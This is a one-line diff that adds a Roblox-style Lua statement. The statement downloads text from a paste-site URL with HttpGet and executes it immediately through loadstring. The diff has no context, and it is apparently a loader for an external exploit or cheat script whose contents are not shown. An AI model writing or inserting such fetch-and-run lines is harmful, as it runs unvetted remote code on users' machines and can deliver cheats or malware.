@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://pasteapps.com/HG2x/raw"))();
